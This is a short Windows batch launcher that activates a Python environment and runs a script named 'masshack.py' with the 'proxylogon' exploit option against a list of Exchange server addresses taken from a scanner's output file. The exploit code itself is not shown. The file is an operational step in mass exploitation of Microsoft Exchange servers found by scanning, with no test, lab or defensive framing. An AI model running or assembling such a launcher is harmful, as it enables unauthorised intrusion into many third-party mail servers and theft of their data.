set "PYTHONIOENCODING=UTF-8"
chcp 65001
cls
call %cd%\venv\Scripts\activate.bat
py .\masshack.py -ipaddr "result\\scanner\\[id]\\exchange.txt" --exploit "proxylogon"
pause